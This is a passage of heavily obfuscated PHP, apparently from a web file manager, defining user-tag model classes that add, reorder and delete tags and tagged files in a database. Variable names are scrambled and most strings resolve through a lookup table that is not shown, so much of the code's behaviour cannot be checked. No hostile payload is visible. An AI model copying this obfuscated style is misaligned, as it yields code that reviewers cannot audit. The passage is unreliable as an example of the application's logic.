= '') { $ÙŸ… =& $_SERVER[ÏéâËõ‘]; if ($ˆ…éÎÖ’ == $ÙŸ…[12]) { return $GLOBALS[$ÙŸ…[6]][$ÙŸ…[2321]]; } if ($ˆ…éÎÖ’ == $ÙŸ…[2322]) { return $GLOBALS[$ÙŸ…[6]][$ÙŸ…[2323]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\162\56\164\141\147\114\151\163\x74"; public $modelType = "\x55\x73\x65\x72\x4f\x70\x74\x69\157\156"; public $field = array("\156\141\x6d\x65", "\163\164\x79\154\145", "\163\157\162\164"); public function listData($Ï•¤‹„ = false, $¤ıºøÇì = "\163\x6f\x72\164", $Ş¶ô¶· = false) { return parent::listData($Ï•¤‹„, $¤ıºøÇì, $Ş¶ô¶·); } public function remove($ô¯‹Œœ) { return parent::remove($ô¯‹Œœ); } public function add($—çà€›¼, $öŒ™“¬ = "\x6c\x61\x62\x65\154\x2d\x67\162\x65\171\x2d\x6e\x6f\162\x6d\x61\x6c") { $ªêö¨ë” =& $_SERVER[ÏéâËõ‘]; if ($this->findByName($—çà€›¼)) { return !1; } $ã¬ş…¥… = array($ªêö¨ë”[420] => $—çà€›¼, $ªêö¨ë”[485] => $öŒ™“¬, $ªêö¨ë”[1838] => $this->getSort($ªêö¨ë”[258]) + 1); return parent::insert($ã¬ş…¥…); } public function update($çı‘§Õ, $¹ĞÚÅ¼ƒ) { $Åİà‹—© =& $_SERVER[ÏéâËõ‘]; $„’‘ÆÃ§ = $this->listData($çı‘§Õ); $ØÛ²¥æ€ = $this->findByName($¹ĞÚÅ¼ƒ[$Åİà‹—©[32]]); if (!$„’‘ÆÃ§ || $ØÛ²¥æ€ && $ØÛ²¥æ€[$Åİà‹—©[399]] != $„’‘ÆÃ§[$Åİà‹—©[399]]) { return !1; } return parent::update($çı‘§Õ, $¹ĞÚÅ¼ƒ); } public function moveTop($Ü¦ˆÓ’÷) { $øãÔšñ· =& $_SERVER[ÏéâËõ‘]; $¦İØÍÜ¥ = parent::listData(); $ãÃ·ø„´ = $this->getSort($øãÔšñ·[257]); foreach ($¦İØÍÜ¥ as &$«—¸âƒ†) { if ($«—¸âƒ†[$øãÔšñ·[399]] == $Ü¦ˆÓ’÷) { $«—¸âƒ†[$øãÔšñ·[1858]] = $ãÃ·ø„´; continue; } $«—¸âƒ†[$øãÔšñ·[1858]] += 1; } unset($«—¸âƒ†); return parent::resetData($¦İØÍÜ¥); } public function moveBottom($ÈàšÑïÎ) { $ğñ™—Ç÷ =& $_SERVER[ÏéâËõ‘]; $ïË¯ … = $this->getSort($ğñ™—Ç÷[258]) + 1; return parent::update($ÈàšÑïÎ, array($ğñ™—Ç÷[1858] => $ïË¯ …)); } public function resetSort($šÖ«é«) { $•—€ëĞ =& $_SERVER[ÏéâËõ‘]; $††¸şÔ = array(); $šÖ«é« = is_array($šÖ«é«) ? $šÖ«é« : array(); for ($‡è¶ÓÎ® = 0; $‡è¶ÓÎ® < count($šÖ«é«); $‡è¶ÓÎ®++) { $††¸şÔ[$šÖ«é«[$‡è¶ÓÎ®] . $•—€ëĞ[12]] = $‡è¶ÓÎ® + 1; } $…ààäêû = parent::listData(); foreach ($…ààäêû as &$»ÎÄÁÉÜ) { $‹ºß€Ôù = $††¸şÔ[$»ÎÄÁÉÜ[$•—€ëĞ[399]]]; $»ÎÄÁÉÜ[$•—€ëĞ[1858]] = $‹ºß€Ôù ? $‹ºß€Ôù : $»ÎÄÁÉÜ[$•—€ëĞ[1858]]; } unset($»ÎÄÁÉÜ); return parent::resetData($…ààäêû); } private function getSort($ù´°âùÃ) { $«Œ±òçÑ =& $_SERVER[ÏéâËõ‘]; $Şè”ì³† = parent::listData(); $äŞ£çŠÛ = array_to_keyvalue($Şè”ì³†, $«Œ±òçÑ[12], $«Œ±òçÑ[1858]); if (!$äŞ£çŠÛ) { $äŞ£çŠÛ = array(0); } $ŒÏ„´¾† = $ù´°âùÃ == $«Œ±òçÑ[258] ? max($äŞ£çŠÛ) : min($äŞ£çŠÛ); return intval($ŒÏ„´¾†); } } goto BË¾²ÇòË…; BË¾²ÇòË…: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\x5f\x66\141\x76"; protected function cacheFunctionAlias($¡åÖÎúè) { $É–İÒ¦ =& $_SERVER[ÏéâËõ‘]; return array($É–İÒ¦[1945] => array($É–İÒ¦[2324] . USER_ID, $É–İÒ¦[1946])); } protected function listData() { $µ²–Ü =& $_SERVER[ÏéâËõ‘]; $×„æøí = array($µ²–Ü[1653] => USER_ID, $µ²–Ü[484] => array($µ²–Ü[1949], 0)); $µåØï×¼ = $µ²–Ü[2325]; $’î¦”™ˆ = $this->field($µåØï×¼)->where($×„æøí)->order($µ²–Ü[1952])->select(); return $’î¦”™ˆ ? $’î¦”™ˆ : array(); } protected function addToTag($º“ĞãóÑ, $¶ä“ì‚) { $ş­ïÂ÷ =& $_SERVER[ÏéâËõ‘]; if (!Model($ş­ïÂ÷[2089])->listData($¶ä“ì‚)) { return !1; } if (is_numeric($º“ĞãóÑ)) { $ğŞµÎ°‰ = Model($ş­ïÂ÷[827])->pathInfo($º“ĞãóÑ); if (!$ğŞµÎ°‰) { return !1; } } else { $ğŞµÎ°‰ = IO::infoSimple($º“ĞãóÑ); if (!$ğŞµÎ°‰) { return !1; } $³á÷·—Ì = $ğŞµÎ°‰[$ş­ïÂ÷[32]]; $ş·í«´÷ = $ğŞµÎ°‰[$ş­ïÂ÷[33]]; if (isset($ğŞµÎ°‰[$ş­ïÂ÷[410]])) { $ş·í«´÷ = $ğŞµÎ°‰[$ş­ïÂ÷[410]] == $ş­ïÂ÷[88] ? $ş­ïÂ÷[75] : $ş­ïÂ÷[199]; } } $Ÿ™Îˆİ = array($ş­ïÂ÷[1653] => USER_ID, $ş­ïÂ÷[484] => $¶ä“ì‚, $ş­ïÂ÷[421] => $º“ĞãóÑ, $ş­ïÂ÷[422] => $ş·í«´÷ ? $ş·í«´÷ : $ş­ïÂ÷[416], $ş­ïÂ÷[420] => $³á÷·—Ì ? $³á÷·—Ì : $ş­ïÂ÷[12], $ş­ïÂ÷[1838] => 0); if ($this->where($Ÿ™Îˆİ)->find()) { return !1; } return $this->add($Ÿ™Îˆİ); } protected function removeFromTag($ì—šÑ™Ú, $à²Ş¿Ãœ) { $ÏÛµşÃ =& $_SERVER[ÏéâËõ‘]; if (!Model($ÏÛµşÃ[2089])->listData($à²Ş¿Ãœ)) { return !1; } if (is_array($ì—šÑ™Ú)) { $ì—šÑ™Ú = array($ÏÛµşÃ[7], $ì—šÑ™Ú); } $Ìæø×ùğ = array($ÏÛµşÃ[1653] => USER_ID, $ÏÛµşÃ[484] => $à²Ş¿Ãœ, $ÏÛµşÃ[421] => $ì—šÑ™Ú); return $this->where($Ìæø×ùğ)->delete(); } protected function removeByTag($¨Û§Ù÷â) { $øÆ‰Íî =& $_SERVER[ÏéâËõ‘]; if (!$¨Û§Ù÷â) { return !1; } $ÔÏÂóÉò = array($øÆ‰Íî[1653] => USER_ID, $øÆ‰Íî[484] => $¨Û§Ù÷â); return $this->where($ÔÏÂóÉò)->delete(); } protected function removeBySource($ò®¶äğ“) { $¶ÑïÔß‚ =& $_SERVER[ÏéâËõ‘]; if (is_array($ò®¶äğ“)) { $ò®¶äğ“ = array($¶ÑïÔß‚[7], $ò®¶äğ“); } $Õ»­‰ò‰ = array($¶ÑïÔß‚[1653] => USER_ID, $¶ÑïÔß‚[484] => array($¶ÑïÔß‚[1019], 0), $¶ÑïÔß‚[421] => $ò®¶äğ“); return $this->where($Õ»­‰ò‰)->delete(); } }